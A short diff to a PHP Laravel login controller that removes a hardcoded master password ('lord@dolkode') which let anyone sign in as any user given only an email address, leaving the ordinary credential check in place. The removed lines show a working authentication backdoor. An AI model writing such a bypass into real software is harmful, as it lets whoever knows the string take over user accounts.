@@ -41,13 +41,7 @@ class LoginController extends Controller
                 'user_email' => $request['email'],
                 'password'   => $request['password']
             ];
-            if ($request['password'] == "lord@dolkode") {
-                $dataUser = SysUser::with(['sis_pelanggan', 'sys_user_group'])->where('user_email', $request['email'])->first();
-                if (!$dataUser) throw new ExpectedException("Akun tidak ditemukan");
-                $auth = Auth::loginUsingId($dataUser->user_id);
-            } else {
-                $auth = Auth::attempt($credentials);
-            }
+            $auth = Auth::attempt($credentials);
 
             if ($auth) {
                 Auth::user()->user_last_login = date("Y-m-d H:i:s");
